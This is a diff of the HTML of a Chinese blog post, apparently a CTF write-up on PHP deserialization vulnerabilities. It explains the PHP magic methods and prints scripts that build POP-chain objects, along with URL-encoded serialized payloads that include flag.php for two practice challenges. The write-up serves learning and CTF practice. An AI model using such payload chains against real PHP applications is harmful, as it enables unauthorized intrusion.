:当从不可访问的属性读取数据。例如从对象外部访问由<code>private</code>和<code>protect</code>修饰的属性，就会调用该方法，其中传递的形参为访问属性的属性名</li></ol><p>ps：上述用法说明不全，使用时应参考相应文档</p><h4 id="简单的案例"><a href="#简单的案例" class="headerlink" title="简单的案例"></a>简单的案例</h4><p><a href="http://hduyyds.top/examples/example_00.php" rel="noopener" target="_blank">题目链接</a></p><p>打开审计源码</p><pre class="language-php line-numbers" data-language="php"><code class="language-php"><span class="token language-php php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name class-name-definition">example</span> <span class="token punctuation">&#123;</span>
     <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function function-definition">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
     <span class="token punctuation">&#123;</span>
         
         <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">flag</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span>
 
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">get</span> <span class="token punctuation">&#123;</span>
+<span class="token keyword">class</span> <span class="token class-name class-name-definition">get</span> <span class="token punctuation">&#123;</span>
     <span class="token keyword">private</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function function-definition">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>
     <span class="token punctuation">&#123;</span>
         <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">return</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token comment">//flag in flag.php</span>
@@ -520,17 +95,13 @@
 <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>这里目的是要触发 __get() 这个函数，魔术方法__get()会在由外部访问对象中的私有属性时自动调用，其中参数伪访问属性的属性名。再观察example这个类，这里发现  __toStrong() 方法，而又存在 <code>echo $a</code> 这句，所以可以确定要构造的这个 $a 就是 example这个类的对象，而且这个对象中的属性 $flag 也应为 get 这个类的对象，从而 执行 <code>return $this-&gt;str-&gt;flag</code>时就会跳转到 get 对象的 魔术方法 __get($name) （$name为要访问的私有属性的名称，即 flag 这个属性名）。之后要 include <code>&#39;flag.php&#39;</code>，由于$name &#x3D;&#x3D; flag，所以要构造 $flag &#x3D;&#x3D; ‘.php’ ，拼接起来就可以包含 ‘flag.php’ 从而拿到flag。</p>
-<p>即</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">example</span> <span class="token punctuation">&#123;</span>
+</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里目的是要触发 __get() 这个函数，魔术方法__get()会在由外部访问对象中的私有属性时自动调用，其中参数伪访问属性的属性名。再观察example这个类，这里发现 __toStrong() 方法，而又存在 <code>echo $a</code> 这句，所以可以确定要构造的这个 $a 就是 example这个类的对象，而且这个对象中的属性 $flag 也应为 get 这个类的对象，从而 执行 <code>return $this-&gt;str-&gt;flag</code>时就会跳转到 get 对象的 魔术方法 __get($name) （$name为要访问的私有属性的名称，即 flag 这个属性名）。之后要 include <code>&#39;flag.php&#39;</code>，由于$name &#x3D;&#x3D; flag，所以要构造 $flag &#x3D;&#x3D; ‘.php’ ，拼接起来就可以包含 ‘flag.php’ 从而拿到flag。</p><p>即</p><pre class="language-php line-numbers" data-language="php"><code class="language-php"><span class="token language-php php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name class-name-definition">example</span> <span class="token punctuation">&#123;</span>
     <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">get</span> <span class="token punctuation">&#123;</span>
+<span class="token keyword">class</span> <span class="token class-name class-name-definition">get</span> <span class="token punctuation">&#123;</span>
     <span class="token keyword">private</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
-    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span>
+    <span class="token keyword">function</span> <span class="token function function-definition">__construct</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span>
     <span class="token punctuation">&#123;</span>
         <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">flag</span> <span class="token operator">=</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
@@ -538,19 +109,11 @@
 <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">example</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>运行得到payload</p>
-<pre class="line-numbers language-none"><code class="language-none">O%3A7%3A%22example%22%3A1%3A%7Bs%3A3%3A%22str%22%3BO%3A3%3A%22get%22%3A1%3A%7Bs%3A9%3A%22%00get%00flag%22%3Bs%3A4%3A%22.php%22%3B%7D%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>​    <strong>对这道题的简单简单的总结：首先必需要了解php在反序列化中这几个魔术方法的用法，如果连这个都不知道的话基本就没法做。另外要了解面向对象的这种编程思想，注意对象在其中的各种应用。类似的其他的php反序列化的题目基本上也都是相同的思路，明白如何通过已知的代码将各对象之间联系起来。</strong></p>
-<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><a target="_blank" rel="noopener" href="http://hduyyds.top/examples/example_01.php">ctfshow卷王杯 web1 easy unserialize</a></p>
-<p>审计源码</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">one</span> <span class="token punctuation">&#123;</span>
+<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行得到payload</p><pre class="line-numbers language-none"><code class="language-none">O%3A7%3A%22example%22%3A1%3A%7Bs%3A3%3A%22str%22%3BO%3A3%3A%22get%22%3A1%3A%7Bs%3A9%3A%22%00get%00flag%22%3Bs%3A4%3A%22.php%22%3B%7D%7D<span class="line-numbers-rows" aria-hidden="true"><span></span></span></code></pre><p>​ <strong>对这道题的简单简单的总结：首先必需要了解php在反序列化中这几个魔术方法的用法，如果连这个都不知道的话基本就没法做。另外要了解面向对象的这种编程思想，注意对象在其中的各种应用。类似的其他的php反序列化的题目基本上也都是相同的思路，明白如何通过已知的代码将各对象之间联系起来。</strong></p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><a href="http://hduyyds.top/examples/example_01.php" rel="noopener" target="_blank">ctfshow卷王杯 web1 easy unserialize</a></p><p>审计源码</p><pre class="language-php line-numbers" data-language="php"><code class="language-php"><span class="token language-php php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name class-name-definition">one</span> <span class="token punctuation">&#123;</span>
     <span class="token keyword">public</span> <span class="token variable">$object</span><span class="token punctuation">;</span>
 
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">MeMeMe</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function function-definition">MeMeMe</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
         <span class="token function">array_walk</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$fn</span><span class="token punctuation">,</span> <span class="token variable">$prev</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
             <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$fn</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"Happy_func"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$prev</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"year_parm"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                 <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -559,35 +122,35 @@
         <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
 
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function function-definition">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
         @<span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword type-declaration">object</span><span class="token operator">-></span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
 
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function function-definition">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
         <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword type-declaration">object</span><span class="token operator">-></span><span class="token keyword type-declaration">string</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span>
 
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">second</span> <span class="token punctuation">&#123;</span>
+<span class="token keyword">class</span> <span class="token class-name class-name-definition">second</span> <span class="token punctuation">&#123;</span>
     <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
 
-    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">addMe</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function function-definition">addMe</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
         <span class="token keyword">return</span> <span class="token string double-quoted-string">"Wow you have sovled"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
 
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function function-definition">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
         <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token operator">.</span><span class="token string double-quoted-string">"Me"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span>
 
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">third</span> <span class="token punctuation">&#123;</span>
+<span class="token keyword">class</span> <span class="token class-name class-name-definition">third</span> <span class="token punctuation">&#123;</span>
     <span class="token keyword">private</span> <span class="token variable">$string</span><span class="token punctuation">;</span>
 
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function function-definition">__construct</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
         <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword type-declaration">string</span> <span class="token operator">=</span> <span class="token variable">$string</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
 
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function function-definition">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
         <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$name</span><span class="token punctuation">;</span>
         <span class="token variable">$var</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
@@ -598,46 +161,31 @@
 <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token delimiter important">?></span></span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​ 这里基本的魔术方法就不再解释了，重点说一下这几个不常见的。</p><p>​ 这里首先解释一下 <code>array_walk()</code>这个函数。这个函数在当前题目的形式是 <code>array_walk($array, function($value, $key) &#123;&#125;)</code> ，这个函数可以将目标数组中的每一个元素给后面参数中的函数来处理，这里 $array 是一个数组 <strong>或一个类对象（其可以看作是一个数组，其中的属性为数组中的键值对）</strong>。后面的匿名函数第一个参数为数组（对象）中的 “值”（属性值），第二个参数为数组（对象）中的 “键”（属性名）。</p><p>​ 后面 __call($func, $args) 函数是在调用对象中不存在的方法时会自动调用，参数 $func 是所调用函数的函数名， $args 是对应函数的参数。 call_user_func([$this, $func], $args) 方法是调用对象中具体函数的一种方法，[]中第一个参数是对象，第二个参数为对象中需要调用的函数的函数名（字符串格式）,$args 参数是所调用函数中的参数。</p><p>​ __get($name) 函数是当从外部访问类中的私有属性的时候会自动调用，参数 $name 是所访问的属性名。</p><p>​ 同时要知道在 php 中调用类中的函数还有一种不常用的方法，如下</p><pre class="language-php line-numbers" data-language="php"><code class="language-php"><span class="token language-php php"><span class="token delimiter important">&lt;?php</span>
 
-<p>​    这里基本的魔术方法就不再解释了，重点说一下这几个不常见的。</p>
-<p>​    这里首先解释一下 <code>array_walk()</code>这个函数。这个函数在当前题目的形式是 <code>array_walk($array, function($value, $key) &#123;&#125;)</code> ，这个函数可以将目标数组中的每一个元素给后面参数中的函数来处理，这里 $array 是一个数组 <strong>或一个类对象（其可以看作是一个数组，其中的属性为数组中的键值对）</strong>。后面的匿名函数第一个参数为数组（对象）中的 “值”（属性值），第二个参数为数组（对象）中的 “键”（属性名）。</p>
-<p>​    后面 __call($func, $args) 函数是在调用对象中不存在的方法时会自动调用，参数 $func 是所调用函数的函数名， $args 是对应函数的参数。 call_user_func([$this, $func], $args) 方法是调用对象中具体函数的一种方法，[]中第一个参数是对象，第二个参数为对象中需要调用的函数的函数名（字符串格式）,$args 参数是所调用函数中的参数。</p>
-<p>​    __get($name) 函数是当从外部访问类中的私有属性的时候会自动调用，参数 $name 是所访问的属性名。</p>
-<p>​    同时要知道在 php 中调用类中的函数还有一种不常用的方法，如下</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">testFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+<span class="token keyword">class</span> <span class="token class-name class-name-definition">test</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function function-definition">testFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
         <span class="token keyword">echo</span> <span class="token string single-quoted-string">'test success!!!'</span><span class="token punctuation">;</span>
         <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br/>调用了函数testFunc()'</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">[</span><span class="token variable">$obj</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'testFunc'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用obj对象中的 testFunc()</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>运行结果如下</p>
-<p><img src="/../post-img/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93.assets/image-20220306200009827.png" alt="image-20220306200009827" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/../post-img/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93.assets/image-20220306200009827.png" class="lozad post-image"></p>
-<p>这一点用在了上面例题的 <code> $var[$name]();</code></p>
-<p>​    把该解释的都解释了，那接下来就说说这题怎么去做。这题其实还是有点复杂的，就借一张图来说吧。</p>
-<p><img src="/../post-img/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93.assets/%E9%A2%98%E8%A7%A3-16465733839111.png" alt="题解" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/../post-img/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93.assets/%E9%A2%98%E8%A7%A3-16465733839111.png" class="lozad post-image"></p>
-<p>对应代码</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">one</span> <span class="token punctuation">&#123;</span>
+<span class="token punctuation">[</span><span class="token variable">$obj</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'testFunc'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用obj对象中的 testFunc()</span></span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果如下</p><p><img alt="image-20220306200009827" class="lozad post-image" src="/../post-img/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93.assets/image-20220306200009827.png" data-src="/../post-img/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93.assets/image-20220306200009827.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E"></p><p>这一点用在了上面例题的 <code>$var[$name]();</code></p><p>​ 把该解释的都解释了，那接下来就说说这题怎么去做。这题其实还是有点复杂的，就借一张图来说吧。</p><p><img alt="题解" class="lozad post-image" src="/../post-img/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93.assets/%E9%A2%98%E8%A7%A3-16465733839111.png" data-src="/../post-img/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93.assets/%E9%A2%98%E8%A7%A3-16465733839111.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E"></p><p>对应代码</p><pre class="language-php line-numbers" data-language="php"><code class="language-php"><span class="token language-php php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name class-name-definition">one</span> <span class="token punctuation">&#123;</span>
     <span class="token keyword">public</span> <span class="token variable">$object</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">second</span> <span class="token punctuation">&#123;</span>
+<span class="token keyword">class</span> <span class="token class-name class-name-definition">second</span> <span class="token punctuation">&#123;</span>
     <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function function-definition">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
         <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$filename</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span>
 
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">third</span> <span class="token punctuation">&#123;</span>
+<span class="token keyword">class</span> <span class="token class-name class-name-definition">third</span> <span class="token punctuation">&#123;</span>
     <span class="token keyword">private</span> <span class="token variable">$string</span><span class="token punctuation">;</span>
 
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function function-definition">__construct</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
         <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword type-declaration">string</span> <span class="token operator">=</span> <span class="token variable">$string</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span>
@@ -651,412 +199,4 @@
 
 <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>运行得到payload</p>
-<pre class="line-numbers language-none"><code class="language-none">O%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3BO%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22%00third%00string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BN%3Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-  </div>
-  <div>
-    
-      <div 
-        class="post-note note-warning copyright" 
-        style="margin-top: 42px">
-        <p>
-          <span style="font-weight: bold;">作者：</span><a 
-            target="_blank" 
-            rel="nofollow noopener noreferrer" 
-            href="/about">
-            pankas
-          </a>
-        </p>
-        <p>
-          <span style="font-weight: bold;">文章链接：</span><a 
-            target="_blank" 
-            rel="nofollow noopener noreferrer" 
-            href="https://pankas.top/2022/03/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/">
-            https://pankas.top/2022/03/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/
-          </a>
-        </p>
-        <p><span style="font-weight: bold;">版权声明：</span>转载请注明出处！</p>
-      </div>
-    
-  </div>
-</article>
-<div class="nav">
-  
-  
-    <div class="nav-item-next">
-      <a 
-        href="/2022/02/23/baidufanyi-project/" 
-        class="nav-link">
-        <div>
-          <div class="nav-label">下一篇</div>
-          
-            <div class="nav-title">记对百度翻译的一次爬虫练习 </div>
-          
-        </div>
-        <i class="iconfont icon-right nav-next-icon"></i>
-      </a>
-    </div>
-  
-</div>
-
-<div 
-  class="card card-content toc-card" 
-  id="mobiletoc">
-  <div class="toc-header">
-  <i 
-    class="iconfont icon-menu" 
-    style="padding-right: 2px;">
